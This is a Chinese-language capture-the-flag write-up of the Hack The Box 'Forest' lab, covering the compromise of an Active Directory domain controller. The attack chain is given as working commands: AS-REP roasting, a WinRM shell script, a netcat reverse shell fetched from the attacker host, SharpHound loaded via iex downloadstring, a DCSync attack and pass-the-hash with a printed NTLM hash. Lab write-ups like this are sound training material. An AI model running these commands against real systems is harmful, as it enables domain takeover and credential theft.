---
title: 'Hack the box: Forset'
date: 2020-09-22 20:42:48
tags:
- htb
categories:
- [htb]
---

![](https://p0.ssl.qhimg.com/t01040622b2d71e783a.png)

## 0x00 前言

**关于Hack the box：**[Hack The Box](https://www.hackthebox.eu/)是一个全球知名的渗透测试靶机平台，在这个平台上，靶机区分为两种状态`active`、`retired`。对于`retired`状态的靶机，需要成为付费vip才能访问（£100/年或者£10/月）。

**关于Forest lab：**我在寻找测试靶机的过程中，发现Forest在处于`retired`状态下依然可以访问，继承“白嫖一时爽，再一次更爽”的精神，今天决定对Forest下手。（前期已经白嫖过Sniper这个靶机，通过详情可参见我的上一篇安全客文章：）下图是对Sniper的简要介绍：

![](https://p2.ssl.qhimg.com/t01a3102f9d3401b0f5.png)

![](https://p5.ssl.qhimg.com/t014ee4fb53a8ba6db0.png)

**使用工具：**kali、masscan、nmap、rpcclient、Impacket工具、necat、BloodHound工具、Apache、Samba、Aclpwn

## 0x02 信息收集

使用`masscan`对靶机Forest的ip：10.10.10.161 进行扫描:


```shell
~$ masscan -e tun0 -p1-65535,U:1-65535 10.10.10.161 --rate=1000
```

![](https://p3.ssl.qhimg.com/t01a777dd8e4966e96e.png)

发现一堆开放端口，貌似真的有点多。。。使用`nmap`收集对应端口的服务信息：


```shell
~$ nmap -n -v -Pn -p 389,135,139,49682,49674,49655,5985,3268,47001,49675,49667,53,464,636,49902,593,88,9389,49664,49666,48671,445,49701 -A --reason 10.10.10.161 -oN nmap.txt
```

![](https://p2.ssl.qhimg.com/t011b2b0b254b27dae0.png)

发现端口53（dns）、88（kerberos）、5985（winrm）、389/3268（ldap）、135/139/445（rpc）等。从`3268/tcp  open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)`这条信息可以发现，靶机Forest应该是`htb.local`的域控制组。

尝试用RPC来枚举用户，使用`rpcclietn`连接，并获取用户了列表：

```shell
~$ rpcclient -U "" -N 10.10.10.161
```

![](https://p4.ssl.qhimg.com/t016138144cbbd07b76.png)

获取组列表：

![](https://p5.ssl.qhimg.com/t0100adbc0a5955dc81.png)

查看`Domain Admins`以及其中的`0x1f4`成员，并发现他是Administrator：

![](https://p2.ssl.qhimg.com/t01d1e35a802a0fe9a1.png)

## 0x03 获得低权限的shell

> 这里的思路是沿着Kerberos认证向下进行的：Kerberos是一种非常复杂的身份验证协议，但它还存在一些缺陷。对Windows域认证体系下的Kerberos认证不了解的小伙伴，可以学习知乎上的这篇文章——[初识 Windows域认证体系 Kerberos认证](https://zhuanlan.zhihu.com/p/77873456) 。
>
> 其中之一的缺陷就是使得攻击者可以从kerberos服务器请求数据，并对响应进行暴力攻击以找出用户密码,这就是AS-REP Roast攻击，可以参见这篇文章——[Roasting AS-REPs](http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/) 。
>
> ![](https://p3.ssl.qhimg.com/t010acf046da3b041c3.png)

为了验证漏洞，我开始浏览Impacket工具，找到`GetNPUsers.py`：https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py 。这个脚本的功能是遍历用户列表，并找到那些`Do not require Kerberos preauthentication`即“不需要kerberos预验证”的用户。

我将所有用户保存在`users.txt`中，并执行`GetNPUsers.py`，成功获取到`svc-alfresco`账户的`TGT`hash：

```shell
~$ for user in $(cat users.txt);do ./GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user}; done
```

![](https://p2.ssl.qhimg.com/t012924f4f6d812f4fb.png)

![](https://p0.ssl.qhimg.com/t013ae5e13aa0d298da.png)

下面就是破解hash，使用`hashcat`进行破解，得到明文密码为`s3rvice`:

![](https://p2.ssl.qhimg.com/t01c72e6a054f030e21.png)

现在我已经拥有了一个完整的账户认证`svc-alfresco:s3rvice`，下面就是找到交互点。在nmap执行结果中，我发现端口5985是打开的，并开启`winrm`服务。为了与该服务交互，创建了一个winrm-shell脚本：

```ruby
require 'winrm'

conn = WinRM::Connection.new(
  endpoint: 'http://10.10.10.161:5985/wsman',
  user: 'svc-alfresco',
  password: 's3rvice',
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        print "PS > "
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
```

执行交互，成功获取到`svc-alfresco`的shell：

![](https://p3.ssl.qhimg.com/t0167b9a4c0dd0987c0.png)


**- 进入`svc-alfresco`用户的桌面，拿到`user flag`:**

![](https://p4.ssl.qhimg.com/t01062c6915af4c6690.png)

为了操作方便后续操作，我决定建立反向shell。把`nc64.exe`放入`/var/html/www`目录，开启Apache 服务：

```shell
~$ sudo service apache2 start  
```

![](https://p5.ssl.qhimg.com/t01b3d6b2f9eecdd52d.png)

在winrm-shell中，下载执行，成功获取反向shell：

```powershell
PS > iwr -uri http://10.10.14.67/nc64.exe -outf shell.exe
PS > ./shell.exe 10.10.14.67 8888 -e powershell.exe
```

![](https://p3.ssl.qhimg.com/t01983c216d5089e503.png)

![](https://p4.ssl.qhimg.com/t013fbea0b507b7a77e.png)

## 0x04 提权

>这里使用到了[Bloodhound](https://github.com/BloodHoundAD/BloodHound/)工具，如果有小伙伴对`active directly attack`不了解，可以参见它的github主页：https://github.com/BloodHoundAD/BloodHound/ 和知乎文章：[《使用BloodHound查找Active Directory攻击路径》](https://zhuanlan.zhihu.com/p/121552304)。BloodHound是基于图的权限探索工具，它将列出给定域中对象之间的权限和关系，可以识别Active Directory（AD）中的不同攻击路径，其中包括访问控制列表（ACL）、用户、组、信任关系和唯一的AD对象等。
>
>kali可以直接运行命令安装：`sudo apt-get install bloodhound`。

首先将项目git到本地：

```shell
~$ git clone https://github.com/BloodHoundAD/BloodHound.git
```

这里要使用`/BloodHoundAD/BloodHound/blob/master/Ingestors/`目录下的`SharpHound.ps1`工具。将它放入`/var/html/www`中，在`svc-alfresco`的shell中加载执行：

```powershell
PS C:\Users\svc-alfresco\evil> iex(new-object net.webclient).downloadstring("http://10.10.14.67/SharpHound.ps1")

PS C:\Users\svc-alfresco\evil> invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice

-----------------------------------------------
Initializing SharpHound at 12:38 AM on 4/2/2020
-----------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain HTB.LOCAL using path CN=Schema,CN=Configuration,DC=HTB,DC=LOCAL
PS C:\Users\svc-alfresco\evil> [+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 84 MB RAM
Status: 123 objects finished (+123 24.6)/s -- Using 118 MB RAM
Enumeration finished in 00:00:05.8247737
Compressing data to C:\Users\svc-alfresco\evil\20200402003811_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 12:38 AM on 4/2/2020! Happy Graphing!
```

执行结束后，可以看到当前目录生成了`20200402003811_BloodHound.zip `的分析结果：

![](https://p1.ssl.qhimg.com/t01dc23f740f2e59396.png)

为了将分析结果取回，我在kali上开启了samba服务：

Sam.conf:

```txt
...
[global]
workgroup = WORKGROUP
server string = Samba Server %v
netbios name = kali
security = user
map to guest = bad user
name resolve order = bcast host
dns proxy = no
bind interfaces only = yes

# add to the end
[evil]
   path = /home/forest
   writable = yes
   guest ok = yes
   guest only = yes
   read only = no
   create mode = 0777
   directory mode = 0777
   force user = nobody
```

![](https://p4.ssl.qhimg.com/t0101e6e2a4319963a7.png)

> 这里遇到一个小坑，如果靶机无法复制文件到共享目录（提示权限问题），可以直接将kali上这一共享的文件夹权限设为777，就可以成功传文件了。我猜测虽然在配置smb.conf时设置了`write`权限，配置了777，出现这个问题可能是配置与建立文件夹的先后顺序的问题。

```powershell
PS C:\Users\svc-alfresco\evil> copy 20200402003811_BloodHound.zip \\10.10.14.67\evil
```

成功取回分析文件：

![](https://p0.ssl.qhimg.com/t014128cf0bf6cef0ac.png)

在kali上启动BloodHound：

![](https://p5.ssl.qhimg.com/t01507083738ba654c7.png)

![](https://p3.ssl.qhimg.com/t01c0103d4cb9d0eb83.png)

导入分析文件`20200402003811_BloodHound.zip`，在搜索栏中搜索``svc-alfresco@htb.local`，添加`target：Administrator@htb.local`，可以看到分析路径图：

![](https://p5.ssl.qhimg.com/t014efdf9a589c83934.png)

从图中可以发现，用户`svc-alfresco`是`SERVICE ACCOUNT@HTB.LOCAL`组的成员，该组是另一个组`PRIVILEGED ACCOUNT@HTB.LOCAL`的成员，进而又是`ACCOUNT OPREATION@HTB.LOCAL`组的成员，进而又是`EXCHANGE WINDOWS PERMISSIONS@HTB.LOACL`组的成员，最终连接到域`HTB.LOCAL`，并且还拥有`WriteDACL`权限。这一系列关键信息告诉我，可以为用户`svc-alfresco`授予`DCSync`特权，并展开`DCSync攻击`。

这里使用了`aclpwn.py`工具进行自动化的利用，对该工具不了解的小伙伴可以参见它的手册：https://github.com/fox-it/aclpwn.py/wiki/Quickstart ：

```shell
~$ ./aclpwn.py --from svc-alfresco@htb.local --domain htb.local --server 10.10.10.161 --user svc-alfresco --source-password 's3rvice'
```

![](https://p2.ssl.qhimg.com/t012b0f00897f4a809c.png)

接着`secretsdump.py`获取域中所有的用户hash，成功收获`Administrator`的hash值：

```shell
~$ ./secretsdump.py -just-dc-ntlm 'svc-alfresco:s3rvice@10.10.10.161'   
```

![](https://p2.ssl.qhimg.com/t0104fe28891db822c0.png)

利用Impacket工具中`wmiexec.py`脚本，使用该hash登录Administrator用户，成功获得超级权限：

```shell
~$ python ./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
```

![](https://p3.ssl.qhimg.com/t01b74cf7cf4d6a0dfd.png)

进入超级用户桌面，成功拿到`root flag`:

![](https://p4.ssl.qhimg.com/t0117e15cb637b6e633.png)

## 0x05 总结

域渗透还需要进一步学习和提高，这次针对Forest靶机的渗透，弥补了很多知识空白，过程并不像文章整理的那样流畅，是一个自认为挺艰难的的过程。

最后，对Forest靶机的渗透测试过程进行一个简单的总结：

- **信息收集：**查看端口、服务状态，获取到域内关键信息

- **AS-REP Roast攻击 + hash 爆破：**获取低级用户的密码，拿到user flag

- **利用BloodHound展开域渗透分析**

- **利用ACLPWN工具展开DCSync攻击：**提权，获得超级用户的hash，拿到root flag

